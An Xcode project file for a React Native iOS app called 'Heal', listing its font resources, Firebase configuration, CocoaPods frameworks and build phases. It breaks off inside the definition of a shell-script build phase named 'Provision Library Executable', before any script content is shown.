// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 54;
	objects = {

/* Begin PBXBuildFile section */
		00FEE36FA9547C3B998F9809 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = D4DF5B5E72939E3052CEA628 /* PrivacyInfo.xcprivacy */; };
		025136F7847D472CB39E2436 /* Recoleta Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = 87F6417457A849DF9ABF388F /* Recoleta Medium.otf */; };
		06725B6701E44210AD92782D /* Recoleta Alt Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = 38918BCDFAE44A0AB8500595 /* Recoleta Alt Light.otf */; };
		0680A44C12DC4863B19BA043 /* Recoleta Alt Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = CE23CACAC94D4DA69D22984D /* Recoleta Alt Bold.otf */; };
		0A152EC5A5864145BBF1D579 /* Poppins-ExtraBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 1392BE14772F4DC6A9CDB01C /* Poppins-ExtraBoldItalic.ttf */; };
		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
		1636012372394DF19C30F52D /* Poppins-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = F274E1C5D40C4F59B0D47636 /* Poppins-MediumItalic.ttf */; };
		1A11B7AE2D9D205700F2B75E /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1A11B7AD2D9D205700F2B75E /* AppDelegate.swift */; };
		2426DB8808984AE38CC808EE /* Recoleta Bold.otf in Resources */ = {isa = PBXBuildFile; fileRef = DFA370B9E16A48D7915484AD /* Recoleta Bold.otf */; };
		24C9A5B4CCDA4C4DAE6060BD /* Poppins-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC08745BE00246ECA3E68DFB /* Poppins-Regular.ttf */; };
		356E47E27B0146B6B3CA2DF1 /* Poppins-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 3646C9305B16414F9CD1C9B9 /* Poppins-Italic.ttf */; };
		378AAFEB74914916B907E952 /* Poppins-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = CAEFD1E1DFBD4AF9B6D5C8C6 /* Poppins-Thin.ttf */; };
		3999DE1C22624AF6AB3B3D6F /* Recoleta SemiBold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 7BF6EBE1B21245A69D50C740 /* Recoleta SemiBold.otf */; };
		39A71841B7E545F38CE34DA2 /* Recoleta Alt Medium.otf in Resources */ = {isa = PBXBuildFile; fileRef = 7DB6DC78270C4F458D7E8AE1 /* Recoleta Alt Medium.otf */; };
		3B1D3AAC4DC241D4A0988FB5 /* Poppins-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 87A2E32AE0724361B35B097F /* Poppins-LightItalic.ttf */; };
		4CEEC38C2615456C8FC07140 /* Recoleta Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = BB4148B54B414431B156CC2A /* Recoleta Regular.otf */; };
		52A9166F2F9F895C00BDC9B5 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 52A9166E2F9F895C00BDC9B5 /* GoogleService-Info.plist */; };
		669801CFAEA2A9E2C02759E0 /* Pods_Heal.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8A32A1527C6DC69EA99426C7 /* Pods_Heal.framework */; };
		689C9ACD88F84FE9BC928E42 /* Poppins-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 9E81FDC9204A4DEFBAAB25CE /* Poppins-BoldItalic.ttf */; };
		6A71ADB1787645C69477523D /* Poppins-SemiBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 72264700249E474AABE85F9A /* Poppins-SemiBoldItalic.ttf */; };
		71120FDBD30D49AE91964EE9 /* Poppins-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = AB804CEF9DDB42B2A58A6078 /* Poppins-SemiBold.ttf */; };
		78053D187305450691870A8E /* Poppins-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 2E74401AA272482FB3831647 /* Poppins-Bold.ttf */; };
		81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */; };
		85B9271E2675400E9C0FB1E5 /* Recoleta Alt Thin.otf in Resources */ = {isa = PBXBuildFile; fileRef = A6BAB1E440B8475990C31242 /* Recoleta Alt Thin.otf */; };
		9382E7F892BB460CBE5DC199 /* Poppins-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 08E9EA2B027D4F2F8BC1E482 /* Poppins-Light.ttf */; };
		9AA721E969D447089CC7AECD /* Recoleta Alt SemiBold.otf in Resources */ = {isa = PBXBuildFile; fileRef = 42AD7F6EC78E4DA397BB62E9 /* Recoleta Alt SemiBold.otf */; };
		A5814F1267BB4466BC5CEA22 /* Recoleta Alt Regular.otf in Resources */ = {isa = PBXBuildFile; fileRef = D4699D0099204E4D904F4119 /* Recoleta Alt Regular.otf */; };
		A9C471E9CA324735950C88FD /* Poppins-ThinItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = A4078E51C3AA495485DB0A6B /* Poppins-ThinItalic.ttf */; };
		AC30ADAFCF7E4078A8BE92D5 /* Recoleta Alt Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = 4506CAB96FD14671AA9E1FF8 /* Recoleta Alt Black.otf */; };
		AEBBCA3B9E4A4C339843AE49 /* Poppins-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = B944755217094467999D22C5 /* Poppins-ExtraLight.ttf */; };
		BD0BE36B6ED24F89A58CEF0C /* Poppins-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 24D01153C92B496D840A63AF /* Poppins-ExtraBold.ttf */; };
		C5B15EE313974B53B07824A4 /* Poppins-ExtraLightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 7EFB765C629A42BE9CC61AFC /* Poppins-ExtraLightItalic.ttf */; };
		D3E25B6086434A0DB48707D7 /* Poppins-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 012466BC72B24D199CA5820C /* Poppins-Black.ttf */; };
		D98073B898A84E5384C65868 /* Poppins-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 6FCA7E34FD1E4DDABE3BE5CB /* Poppins-Medium.ttf */; };
		DCD8E5357E724368BDD06F4B /* Poppins-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = 34ECDC8C49E7421E95456A50 /* Poppins-BlackItalic.ttf */; };
		E7782C55E34A4B9B90A453B1 /* Recoleta Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = 942041D030DA4575BA80AFE3 /* Recoleta Black.otf */; };
		F48FEAE7E0294F3194144131 /* Recoleta Light.otf in Resources */ = {isa = PBXBuildFile; fileRef = 4D33F771D9EF495D9247AE07 /* Recoleta Light.otf */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		012466BC72B24D199CA5820C /* Poppins-Black.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Black.ttf"; path = "../assets/fonts/Poppins-Black.ttf"; sourceTree = "<group>"; };
		08E9EA2B027D4F2F8BC1E482 /* Poppins-Light.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Light.ttf"; path = "../assets/fonts/Poppins-Light.ttf"; sourceTree = "<group>"; };
		1392BE14772F4DC6A9CDB01C /* Poppins-ExtraBoldItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-ExtraBoldItalic.ttf"; path = "../assets/fonts/Poppins-ExtraBoldItalic.ttf"; sourceTree = "<group>"; };
		13B07F961A680F5B00A75B9A /* Heal.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Heal.app; sourceTree = BUILT_PRODUCTS_DIR; };
		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = Heal/Images.xcassets; sourceTree = "<group>"; };
		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = Heal/Info.plist; sourceTree = "<group>"; };
		1A11B7AD2D9D205700F2B75E /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		1A11B7AF2D9D205A00F2B75E /* Heal-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "Heal-Bridging-Header.h"; sourceTree = "<group>"; };
		24D01153C92B496D840A63AF /* Poppins-ExtraBold.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-ExtraBold.ttf"; path = "../assets/fonts/Poppins-ExtraBold.ttf"; sourceTree = "<group>"; };
		2E74401AA272482FB3831647 /* Poppins-Bold.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Bold.ttf"; path = "../assets/fonts/Poppins-Bold.ttf"; sourceTree = "<group>"; };
		34ECDC8C49E7421E95456A50 /* Poppins-BlackItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-BlackItalic.ttf"; path = "../assets/fonts/Poppins-BlackItalic.ttf"; sourceTree = "<group>"; };
		3646C9305B16414F9CD1C9B9 /* Poppins-Italic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Italic.ttf"; path = "../assets/fonts/Poppins-Italic.ttf"; sourceTree = "<group>"; };
		38918BCDFAE44A0AB8500595 /* Recoleta Alt Light.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Alt Light.otf"; path = "../assets/fonts/Recoleta Alt Light.otf"; sourceTree = "<group>"; };
		42AD7F6EC78E4DA397BB62E9 /* Recoleta Alt SemiBold.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Alt SemiBold.otf"; path = "../assets/fonts/Recoleta Alt SemiBold.otf"; sourceTree = "<group>"; };
		4506CAB96FD14671AA9E1FF8 /* Recoleta Alt Black.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Alt Black.otf"; path = "../assets/fonts/Recoleta Alt Black.otf"; sourceTree = "<group>"; };
		4D33F771D9EF495D9247AE07 /* Recoleta Light.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Light.otf"; path = "../assets/fonts/Recoleta Light.otf"; sourceTree = "<group>"; };
		52228CF229D174F300D294CD /* Heal.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; name = Heal.entitlements; path = Heal/Heal.entitlements; sourceTree = "<group>"; };
		52A9166E2F9F895C00BDC9B5 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
		6FCA7E34FD1E4DDABE3BE5CB /* Poppins-Medium.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Medium.ttf"; path = "../assets/fonts/Poppins-Medium.ttf"; sourceTree = "<group>"; };
		72264700249E474AABE85F9A /* Poppins-SemiBoldItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-SemiBoldItalic.ttf"; path = "../assets/fonts/Poppins-SemiBoldItalic.ttf"; sourceTree = "<group>"; };
		7BF6EBE1B21245A69D50C740 /* Recoleta SemiBold.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta SemiBold.otf"; path = "../assets/fonts/Recoleta SemiBold.otf"; sourceTree = "<group>"; };
		7DB6DC78270C4F458D7E8AE1 /* Recoleta Alt Medium.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Alt Medium.otf"; path = "../assets/fonts/Recoleta Alt Medium.otf"; sourceTree = "<group>"; };
		7EFB765C629A42BE9CC61AFC /* Poppins-ExtraLightItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-ExtraLightItalic.ttf"; path = "../assets/fonts/Poppins-ExtraLightItalic.ttf"; sourceTree = "<group>"; };
		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = Heal/LaunchScreen.storyboard; sourceTree = "<group>"; };
		87A2E32AE0724361B35B097F /* Poppins-LightItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-LightItalic.ttf"; path = "../assets/fonts/Poppins-LightItalic.ttf"; sourceTree = "<group>"; };
		87F6417457A849DF9ABF388F /* Recoleta Medium.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Medium.otf"; path = "../assets/fonts/Recoleta Medium.otf"; sourceTree = "<group>"; };
		8A32A1527C6DC69EA99426C7 /* Pods_Heal.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Heal.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		942041D030DA4575BA80AFE3 /* Recoleta Black.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Black.otf"; path = "../assets/fonts/Recoleta Black.otf"; sourceTree = "<group>"; };
		9E81FDC9204A4DEFBAAB25CE /* Poppins-BoldItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-BoldItalic.ttf"; path = "../assets/fonts/Poppins-BoldItalic.ttf"; sourceTree = "<group>"; };
		A4078E51C3AA495485DB0A6B /* Poppins-ThinItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-ThinItalic.ttf"; path = "../assets/fonts/Poppins-ThinItalic.ttf"; sourceTree = "<group>"; };
		A6BAB1E440B8475990C31242 /* Recoleta Alt Thin.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Alt Thin.otf"; path = "../assets/fonts/Recoleta Alt Thin.otf"; sourceTree = "<group>"; };
		AB804CEF9DDB42B2A58A6078 /* Poppins-SemiBold.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-SemiBold.ttf"; path = "../assets/fonts/Poppins-SemiBold.ttf"; sourceTree = "<group>"; };
		B944755217094467999D22C5 /* Poppins-ExtraLight.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-ExtraLight.ttf"; path = "../assets/fonts/Poppins-ExtraLight.ttf"; sourceTree = "<group>"; };
		BB4148B54B414431B156CC2A /* Recoleta Regular.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Regular.otf"; path = "../assets/fonts/Recoleta Regular.otf"; sourceTree = "<group>"; };
		BC08745BE00246ECA3E68DFB /* Poppins-Regular.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Regular.ttf"; path = "../assets/fonts/Poppins-Regular.ttf"; sourceTree = "<group>"; };
		C290ABE79999AE601B2F4587 /* Pods-Heal.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Heal.debug.xcconfig"; path = "Target Support Files/Pods-Heal/Pods-Heal.debug.xcconfig"; sourceTree = "<group>"; };
		CAEFD1E1DFBD4AF9B6D5C8C6 /* Poppins-Thin.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-Thin.ttf"; path = "../assets/fonts/Poppins-Thin.ttf"; sourceTree = "<group>"; };
		CE23CACAC94D4DA69D22984D /* Recoleta Alt Bold.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Alt Bold.otf"; path = "../assets/fonts/Recoleta Alt Bold.otf"; sourceTree = "<group>"; };
		D4699D0099204E4D904F4119 /* Recoleta Alt Regular.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Alt Regular.otf"; path = "../assets/fonts/Recoleta Alt Regular.otf"; sourceTree = "<group>"; };
		D4DF5B5E72939E3052CEA628 /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xml; name = PrivacyInfo.xcprivacy; path = Heal/PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
		DFA370B9E16A48D7915484AD /* Recoleta Bold.otf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Recoleta Bold.otf"; path = "../assets/fonts/Recoleta Bold.otf"; sourceTree = "<group>"; };
		EB411A10EABF34EEA00086FA /* Pods-Heal.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Heal.release.xcconfig"; path = "Target Support Files/Pods-Heal/Pods-Heal.release.xcconfig"; sourceTree = "<group>"; };
		ED297162215061F000B7C4FE /* JavaScriptCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = JavaScriptCore.framework; path = System/Library/Frameworks/JavaScriptCore.framework; sourceTree = SDKROOT; };
		F274E1C5D40C4F59B0D47636 /* Poppins-MediumItalic.ttf */ = {isa = PBXFileReference; explicitFileType = undefined; fileEncoding = 9; includeInIndex = 0; lastKnownFileType = unknown; name = "Poppins-MediumItalic.ttf"; path = "../assets/fonts/Poppins-MediumItalic.ttf"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		13B07F8C1A680F5B00A75B9A /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				669801CFAEA2A9E2C02759E0 /* Pods_Heal.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		13B07FAE1A68108700A75B9A /* Heal */ = {
			isa = PBXGroup;
			children = (
				52228CF229D174F300D294CD /* Heal.entitlements */,
				1A11B7AD2D9D205700F2B75E /* AppDelegate.swift */,
				13B07FB51A68108700A75B9A /* Images.xcassets */,
				52A9166E2F9F895C00BDC9B5 /* GoogleService-Info.plist */,
				13B07FB61A68108700A75B9A /* Info.plist */,
				81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */,
				D4DF5B5E72939E3052CEA628 /* PrivacyInfo.xcprivacy */,
				1A11B7AF2D9D205A00F2B75E /* Heal-Bridging-Header.h */,
			);
			name = Heal;
			sourceTree = "<group>";
		};
		2D16E6871FA4F8E400B85C8A /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				ED297162215061F000B7C4FE /* JavaScriptCore.framework */,
				8A32A1527C6DC69EA99426C7 /* Pods_Heal.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		832341AE1AAA6A7D00B99B32 /* Libraries */ = {
			isa = PBXGroup;
			children = (
			);
			name = Libraries;
			sourceTree = "<group>";
		};
		83CBB9F61A601CBA00E9B192 = {
			isa = PBXGroup;
			children = (
				13B07FAE1A68108700A75B9A /* Heal */,
				832341AE1AAA6A7D00B99B32 /* Libraries */,
				83CBBA001A601CBA00E9B192 /* Products */,
				2D16E6871FA4F8E400B85C8A /* Frameworks */,
				BBD78D7AC51CEA395F1C20DB /* Pods */,
				EDAD9D3A4D154F81921C3352 /* Resources */,
			);
			indentWidth = 2;
			sourceTree = "<group>";
			tabWidth = 2;
			usesTabs = 0;
		};
		83CBBA001A601CBA00E9B192 /* Products */ = {
			isa = PBXGroup;
			children = (
				13B07F961A680F5B00A75B9A /* Heal.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		BBD78D7AC51CEA395F1C20DB /* Pods */ = {
			isa = PBXGroup;
			children = (
				C290ABE79999AE601B2F4587 /* Pods-Heal.debug.xcconfig */,
				EB411A10EABF34EEA00086FA /* Pods-Heal.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		EDAD9D3A4D154F81921C3352 /* Resources */ = {
			isa = PBXGroup;
			children = (
				B944755217094467999D22C5 /* Poppins-ExtraLight.ttf */,
				A4078E51C3AA495485DB0A6B /* Poppins-ThinItalic.ttf */,
				7EFB765C629A42BE9CC61AFC /* Poppins-ExtraLightItalic.ttf */,
				9E81FDC9204A4DEFBAAB25CE /* Poppins-BoldItalic.ttf */,
				08E9EA2B027D4F2F8BC1E482 /* Poppins-Light.ttf */,
				6FCA7E34FD1E4DDABE3BE5CB /* Poppins-Medium.ttf */,
				72264700249E474AABE85F9A /* Poppins-SemiBoldItalic.ttf */,
				1392BE14772F4DC6A9CDB01C /* Poppins-ExtraBoldItalic.ttf */,
				24D01153C92B496D840A63AF /* Poppins-ExtraBold.ttf */,
				34ECDC8C49E7421E95456A50 /* Poppins-BlackItalic.ttf */,
				BC08745BE00246ECA3E68DFB /* Poppins-Regular.ttf */,
				87A2E32AE0724361B35B097F /* Poppins-LightItalic.ttf */,
				2E74401AA272482FB3831647 /* Poppins-Bold.ttf */,
				012466BC72B24D199CA5820C /* Poppins-Black.ttf */,
				CAEFD1E1DFBD4AF9B6D5C8C6 /* Poppins-Thin.ttf */,
				AB804CEF9DDB42B2A58A6078 /* Poppins-SemiBold.ttf */,
				3646C9305B16414F9CD1C9B9 /* Poppins-Italic.ttf */,
				F274E1C5D40C4F59B0D47636 /* Poppins-MediumItalic.ttf */,
				7BF6EBE1B21245A69D50C740 /* Recoleta SemiBold.otf */,
				4506CAB96FD14671AA9E1FF8 /* Recoleta Alt Black.otf */,
				DFA370B9E16A48D7915484AD /* Recoleta Bold.otf */,
				4D33F771D9EF495D9247AE07 /* Recoleta Light.otf */,
				D4699D0099204E4D904F4119 /* Recoleta Alt Regular.otf */,
				7DB6DC78270C4F458D7E8AE1 /* Recoleta Alt Medium.otf */,
				BB4148B54B414431B156CC2A /* Recoleta Regular.otf */,
				CE23CACAC94D4DA69D22984D /* Recoleta Alt Bold.otf */,
				87F6417457A849DF9ABF388F /* Recoleta Medium.otf */,
				38918BCDFAE44A0AB8500595 /* Recoleta Alt Light.otf */,
				A6BAB1E440B8475990C31242 /* Recoleta Alt Thin.otf */,
				942041D030DA4575BA80AFE3 /* Recoleta Black.otf */,
				42AD7F6EC78E4DA397BB62E9 /* Recoleta Alt SemiBold.otf */,
			);
			name = Resources;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		13B07F861A680F5B00A75B9A /* Heal */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "Heal" */;
			buildPhases = (
				47002DEC520A4CFBB699F71F /* Provision Library Executable */,
				CB072280311580C961032702 /* [CP] Check Pods Manifest.lock */,
				FD10A7F022414F080027D42C /* Start Packager */,
				13B07F871A680F5B00A75B9A /* Sources */,
				13B07F8C1A680F5B00A75B9A /* Frameworks */,
				13B07F8E1A680F5B00A75B9A /* Resources */,
				00DD1BFF1BD5951E006B06BC /* Bundle React Native code and images */,
				47413998CC7CAF4F5B7ECD67 /* [CP] Embed Pods Frameworks */,
				C4CC2C2B78655C59811F1792 /* [CP] Copy Pods Resources */,
				A42B82A8B8E621CE4B8D5F38 /* [CP-User] [RNFB] Core Configuration */,
				81E7F53F33D47CAF357EDA05 /* [CP-User] [RNFB] Crashlytics Configuration */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Heal;
			productName = Heal;
			productReference = 13B07F961A680F5B00A75B9A /* Heal.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		83CBB9F71A601CBA00E9B192 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastUpgradeCheck = 1210;
				TargetAttributes = {
					13B07F861A680F5B00A75B9A = {
						LastSwiftMigration = 1620;
					};
				};
			};
			buildConfigurationList = 83CBB9FA1A601CBA00E9B192 /* Build configuration list for PBXProject "Heal" */;
			compatibilityVersion = "Xcode 12.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 83CBB9F61A601CBA00E9B192;
			productRefGroup = 83CBBA001A601CBA00E9B192 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				13B07F861A680F5B00A75B9A /* Heal */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		13B07F8E1A680F5B00A75B9A /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
				00FEE36FA9547C3B998F9809 /* PrivacyInfo.xcprivacy in Resources */,
				AEBBCA3B9E4A4C339843AE49 /* Poppins-ExtraLight.ttf in Resources */,
				A9C471E9CA324735950C88FD /* Poppins-ThinItalic.ttf in Resources */,
				C5B15EE313974B53B07824A4 /* Poppins-ExtraLightItalic.ttf in Resources */,
				689C9ACD88F84FE9BC928E42 /* Poppins-BoldItalic.ttf in Resources */,
				9382E7F892BB460CBE5DC199 /* Poppins-Light.ttf in Resources */,
				D98073B898A84E5384C65868 /* Poppins-Medium.ttf in Resources */,
				6A71ADB1787645C69477523D /* Poppins-SemiBoldItalic.ttf in Resources */,
				0A152EC5A5864145BBF1D579 /* Poppins-ExtraBoldItalic.ttf in Resources */,
				BD0BE36B6ED24F89A58CEF0C /* Poppins-ExtraBold.ttf in Resources */,
				DCD8E5357E724368BDD06F4B /* Poppins-BlackItalic.ttf in Resources */,
				24C9A5B4CCDA4C4DAE6060BD /* Poppins-Regular.ttf in Resources */,
				3B1D3AAC4DC241D4A0988FB5 /* Poppins-LightItalic.ttf in Resources */,
				78053D187305450691870A8E /* Poppins-Bold.ttf in Resources */,
				D3E25B6086434A0DB48707D7 /* Poppins-Black.ttf in Resources */,
				378AAFEB74914916B907E952 /* Poppins-Thin.ttf in Resources */,
				71120FDBD30D49AE91964EE9 /* Poppins-SemiBold.ttf in Resources */,
				356E47E27B0146B6B3CA2DF1 /* Poppins-Italic.ttf in Resources */,
				1636012372394DF19C30F52D /* Poppins-MediumItalic.ttf in Resources */,
				3999DE1C22624AF6AB3B3D6F /* Recoleta SemiBold.otf in Resources */,
				AC30ADAFCF7E4078A8BE92D5 /* Recoleta Alt Black.otf in Resources */,
				2426DB8808984AE38CC808EE /* Recoleta Bold.otf in Resources */,
				F48FEAE7E0294F3194144131 /* Recoleta Light.otf in Resources */,
				A5814F1267BB4466BC5CEA22 /* Recoleta Alt Regular.otf in Resources */,
				39A71841B7E545F38CE34DA2 /* Recoleta Alt Medium.otf in Resources */,
				52A9166F2F9F895C00BDC9B5 /* GoogleService-Info.plist in Resources */,
				4CEEC38C2615456C8FC07140 /* Recoleta Regular.otf in Resources */,
				0680A44C12DC4863B19BA043 /* Recoleta Alt Bold.otf in Resources */,
				025136F7847D472CB39E2436 /* Recoleta Medium.otf in Resources */,
				06725B6701E44210AD92782D /* Recoleta Alt Light.otf in Resources */,
				85B9271E2675400E9C0FB1E5 /* Recoleta Alt Thin.otf in Resources */,
				E7782C55E34A4B9B90A453B1 /* Recoleta Black.otf in Resources */,
				9AA721E969D447089CC7AECD /* Recoleta Alt SemiBold.otf in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		47002DEC520A4CFBB699F71F /* Provision Library Executable */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			alwaysOutOfDate = 1;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Provision Library Executable";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			shellPath = /bin/sh;
			showEnvVarsInLog = 0;	
